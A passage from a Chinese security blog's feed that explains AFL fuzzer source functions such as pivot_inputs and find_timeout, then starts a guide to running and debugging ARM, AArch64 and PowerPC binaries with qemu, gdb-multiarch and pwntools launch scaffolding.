class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//不分大小写如果相同则返回</span>  auto_changed <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a_extras_cnt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//和 a_extras 比较，a_extras 不按大小排序，遍历比较如果有相同的就增加该项的命中率 hit_cnt 并且跳转到 sort_a_extras</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">==</span> len <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">memcmp_nocase</span><span class="token punctuation">(</span>a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>hit_cnt<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> sort_a_extras<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>a_extras_cnt <span class="token operator">&lt;</span> MAX_AUTO_EXTRAS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//未达到最大值就添加进 a_extras</span>    a_extras <span class="token operator">=</span> <span class="token function">ck_realloc_block</span><span class="token punctuation">(</span>a_extras<span class="token punctuation">,</span> <span class="token punctuation">(</span>a_extras_cnt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">extra_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a_extras<span class="token punctuation">[</span>a_extras_cnt<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">ck_memdup</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    a_extras<span class="token punctuation">[</span>a_extras_cnt<span class="token punctuation">]</span><span class="token punctuation">.</span>len  <span class="token operator">=</span> len<span class="token punctuation">;</span>    a_extras_cnt<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//达到最大值就从后半部分随机删除一项然后添加该项</span>    i <span class="token operator">=</span> MAX_AUTO_EXTRAS <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token function">UR</span><span class="token punctuation">(</span><span class="token punctuation">(</span>MAX_AUTO_EXTRAS <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data    <span class="token operator">=</span> <span class="token function">ck_memdup</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len     <span class="token operator">=</span> len<span class="token punctuation">;</span>    a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>hit_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>sort_a_extras<span class="token operator">:</span>  <span class="token function">qsort</span><span class="token punctuation">(</span>a_extras<span class="token punctuation">,</span> a_extras_cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">extra_data</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        compare_extras_use_d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//按命中率对 a_extras 降序排序</span>  <span class="token function">qsort</span><span class="token punctuation">(</span>a_extras<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>USE_AUTO_EXTRAS<span class="token punctuation">,</span> a_extras_cnt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//按大小对前 USE_AUTO_EXTRAS 个条目排序</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">extra_data</span><span class="token punctuation">)</span><span class="token punctuation">,</span> compare_extras_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h3><p>把初始 corpus（语料库） 复制到工作目录的 queue 文件夹下，在 out_put 目录中为 input 测试用例创建硬链接</p><p>循环遍历队列中的每一项</p><ul><li>获取文件名（不包含路径）</li><li>判断文件名是否为 id: 开头并解析 id 值判断是否匹配当前 id<ul><li>通过判断<ul><li>通过判断后设置 resuming_fuzz &#x3D; 1，生成新的文件路径 nfn &#x3D; out_dir&#x2F;queue&#x2F;rsl</li><li>获取 id，循环遍历队列，遍历到相同 id 的项则增加深度，超过最大深度则更新最大深度</li></ul></li><li>未通过判断<ul><li>在文件名中解析 ,orig: 后的字符串给 use_name，不存在则 use_name &#x3D; rsl</li><li>生成新文件路径 nfn &#x3D; out_dir&#x2F;queue&#x2F;id:id,orig:use_name，例如 out&#x2F;fuzzer1&#x2F;queue&#x2F;id:000000,orig:testcase</li></ul></li></ul></li><li>创建硬链接，q-&gt;fname 指向 nfn，更新 fname &#x3D; nfn</li><li>如果该项的 passed_det &#x3D; 1，则代表已经 fuzz 过，调用 mark_as_det_done</li><li>获取队列的下一项，并且增加 id</li><li>循环结束后如果设置了 in_place_resume 则调用 nuke_resume_dir 删除 out_dir&#x2F;_resume&#x2F;.stat&#x2F; 文件夹下的文件</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">pivot_inputs</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q <span class="token operator">=</span> queue<span class="token punctuation">;</span>  u32 id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Creating hard links for all input files..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//队列不为空</span>    u8  <span class="token operator">*</span>nfn<span class="token punctuation">,</span> <span class="token operator">*</span>rsl <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取最后一个 / 的位置，本例中fname = in/testcase，rsl 获取到 /testcase</span>    u32 orig_id<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>rsl<span class="token punctuation">)</span> rsl <span class="token operator">=</span> q<span class="token operator">-></span>fname<span class="token punctuation">;</span> <span class="token keyword">else</span> rsl<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//获取失败则 rsl 就是 fname，成功则下移一个位置去掉 /，得到 testcase</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SIMPLE_FILES</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">CASE_PREFIX</span> <span class="token string">"id:"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">CASE_PREFIX</span> <span class="token string">"id_"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^!SIMPLE_FILES */</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>rsl<span class="token punctuation">,</span> CASE_PREFIX<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span><span class="token comment">//判断文件名开头是否是 id:</span>        <span class="token function">sscanf</span><span class="token punctuation">(</span>rsl <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"%06u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>orig_id<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> orig_id <span class="token operator">==</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//是的话解析 id 判断是否和当前 id 匹配，匹配则说明符合标准格式</span>      u8<span class="token operator">*</span> src_str<span class="token punctuation">;</span>      u32 src_id<span class="token punctuation">;</span>      resuming_fuzz <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      nfn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> rsl<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 生成新的文件路径</span>      src_str <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>rsl <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取 ： 的位置，例如 id:id,orig:use_name，得到 :id,orig:use_name</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>src_str <span class="token operator">&amp;&amp;</span> <span class="token function">sscanf</span><span class="token punctuation">(</span>src_str <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"%06u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>src_id<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//存在 ：，获取后面的数字</span>        <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> s <span class="token operator">=</span> queue<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>src_id<span class="token operator">--</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">)</span> s <span class="token operator">=</span> s<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">//循环遍历到队列中 id 相同的项</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> q<span class="token operator">-></span>depth <span class="token operator">=</span> s<span class="token operator">-></span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//遍历成功则该项深度 +1，表示路径的复杂度或生成顺序</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>max_depth <span class="token operator">&lt;</span> q<span class="token operator">-></span>depth<span class="token punctuation">)</span> max_depth <span class="token operator">=</span> q<span class="token operator">-></span>depth<span class="token punctuation">;</span><span class="token comment">//超过最大深度则更新最大深度</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SIMPLE_FILES</span></span>      u8<span class="token operator">*</span> use_name <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>rsl<span class="token punctuation">,</span> <span class="token string">",orig:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在 rsl 中寻找 ,orig: 的位置给 use_name</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>use_name<span class="token punctuation">)</span> use_name <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token keyword">else</span> use_name <span class="token operator">=</span> rsl<span class="token punctuation">;</span><span class="token comment">//找到则 use_name 为冒号后面的内容，没找到则 use_name = rsl</span>      nfn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/id:%06u,orig:%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> id<span class="token punctuation">,</span> use_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//nfn = out_dir/queue/id:id,orig:use_name，本例是 out/fuzzer1/queue/id:000000,orig:testcase</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>      nfn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/id_%06u"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^!SIMPLE_FILES */</span></span>    <span class="token punctuation">&#125;</span>    <span class="token function">link_or_copy</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">,</span> nfn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建硬链接，q->fname指向nfn</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span>    q<span class="token operator">-></span>fname <span class="token operator">=</span> nfn<span class="token punctuation">;</span><span class="token comment">//更新 fname 为硬链接</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>passed_det<span class="token punctuation">)</span> <span class="token function">mark_as_det_done</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//passed_det = 1 代表已经 fuzz 过</span>    q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>    id<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>in_place_resume<span class="token punctuation">)</span> <span class="token function">nuke_resume_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置了 in_place_resume 则调用 nuke_resume_dir 删除 out_dir/_resume/.stat/ 文件夹下的文件</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SIMPLE_FILES</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h3><p>如果通过 -x 选项指定了 dictionary，则从 dictionary 导入 extra</p><h3 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h3><ul><li>resuming_fuzz &#x3D; 0 直接返回</li><li>in_place_resume &#x3D; 1 打开 out_dir&#x2F;fuzzer_stats，否则打开 in_dir&#x2F;..&#x2F;fuzzer_stats，打开失败就返回</li><li>从文件中读取长度为 sizeof(tmp) - 1，从读取的内容中寻找 “exec_timeout   : “<ul><li>不存在就直接返回</li><li>存在就提取后面的数字，小于等于 4 直接返回，否则赋值给 exec_tmout 并设置 timeout_given &#x3D; 3</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">find_timeout</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>resuming_fuzz<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>in_place_resume<span class="token punctuation">)</span> fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/fuzzer_stats"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//in_place_resume = 1 打开 out_dir/fuzzer_stats</span>  <span class="token keyword">else</span> fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/../fuzzer_stats"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//否则打开 in_dir/../fuzzer_stats</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//打开失败则返回</span>  i <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>i<span class="token punctuation">;</span><span class="token comment">//从文件中读取长度为 sizeof(tmp) - 1</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  off <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">"exec_timeout   : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从读取的内容中寻找 "exec_timeout   : "</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>off<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//不存在就直接返回</span>  ret <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>off <span class="token operator">+</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//存在就提取后面的数字</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//小于等于 4 直接返回</span>  exec_tmout <span class="token operator">=</span> ret<span class="token punctuation">;</span>  timeout_given <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h3><p>检查输入 argv 中是否存在 @@ 指定输入文件，有的话创建并替换 out_file 成 out_dir&#x2F;.cur_input（也可以使用 -f 参数指定 out_file）</p><blockquote><p><code>@@</code> 是一个占位符，用于指定目标程序的输入文件位置。当 AFL 执行模糊测试时，它会将测试用例文件动态替换到命令行中的 <code>@@</code> 位置</p></blockquote><h3 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h3><p>如果 out_file 没有值（没有使用 -f），则调用此函数，会删除原本的 out_dir&#x2F;.cur_input，创建一个新的 out_dir&#x2F;.cur_input ，保存其文件描述符在 out_fd 中，后续 fuzzer 把变异出的 input 写进这里，由 child 读取</p><h3 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h3><p>指定路径处要执行的程序是否存在、是否在 &#x2F;tmp，且它不能是一个 shell script，同时检查 elf 文件头是否合法及程序是否被插桩参考文章</p><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#fuzz-one">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#fuzz-one</a></p><p><a href="https://blog.csdn.net/qq_45323960/article/details/138173267">https://blog.csdn.net/qq_45323960/article/details/138173267</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;afl-gcc&quot;&gt;&lt;a href=&quot;#afl-gcc&quot; class=&quot;headerlink&quot; title=&quot;afl-gcc&quot;&gt;&lt;/a&gt;afl-gcc&lt;/h2&gt;&lt;h3 id=&quot;gdb调试&quot;&gt;&lt;a href=&quot;#gdb调试&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="fuzz" scheme="https://starrysky1004.github.io/categories/fuzz/"/>
    
    
    <category term="fuzz" scheme="https://starrysky1004.github.io/tags/fuzz/"/>
    
    <category term="AFL" scheme="https://starrysky1004.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>异构pwn运行与调试</title>
    <link href="https://starrysky1004.github.io/2025/02/10/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/"/>
    <id>https://starrysky1004.github.io/2025/02/10/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/</id>
    <published>2025-02-10T15:11:50.000Z</published>
    <updated>2025-02-12T12:55:01.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h2><p>安装<code>qemu qemu-user qemu-user-static</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu qemu-user qemu-user-static<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装<code>qemu-system</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system uml-utilities bridge-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行的时候不一定要 -L 指定动态链接库</p><ul><li><p>qemu-usr ：指定动态链接库运行</p><ul><li><p>安装动态链接库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">$ apt search <span class="token string">"libc6-"</span> <span class="token operator">|</span> grep <span class="token string">"powerpc"</span>$ sudo apt<span class="token operator">-</span>get install libc6<span class="token operator">-</span>powerpc<span class="token operator">-</span>cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>qemu-user-static ：包含了所有必需的库和二进制文件，运行静态链接的程序</p></li><li><p>qemu-system ： 模拟整个计算机系统的跨平台运行</p></li></ul><h2 id="调试工具安装"><a href="#调试工具安装" class="headerlink" title="调试工具安装"></a>调试工具安装</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gdb-multiarch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>动态链接库冲突：<code>set sysroot lib路径</code></p><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><h3 id="arm32"><a href="#arm32" class="headerlink" title="arm32"></a>arm32</h3><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-arm <span class="token parameter variable">-L</span> /usr/arm-linux-gnueabi ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span><span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/arm-linux-gnueabi"</span><span class="token punctuation">,</span> fileName<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb filename<span class="token builtin class-name">set</span> architecture armadd-symbol-file/set solib-search-path ./libc.so.6attach pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-aarch64-linux-gnu g++-aarch64-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h4><p><code>-g</code>指定端口，<code>-L</code>指定动态链接库，静态链接的程序无需该参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-aarch64 <span class="token parameter variable">-L</span> /usr/aarch64-linux-gnu/ ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定 libc 文件运行：文件结构 .&#x2F;libc&#x2F;lib&#x2F; 下存放 ld 和 libc，-L 指定 .&#x2F;libc</p><h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture aarch64<span class="token builtin class-name">set</span> endian littleadd-symbol-file ./libc-2.21.sotarget remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/aarch64-linux-gnu/"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="powerpc"><a href="#powerpc" class="headerlink" title="powerpc"></a>powerpc</h2><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><p>安装<code>powerpc</code>交叉编译工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token 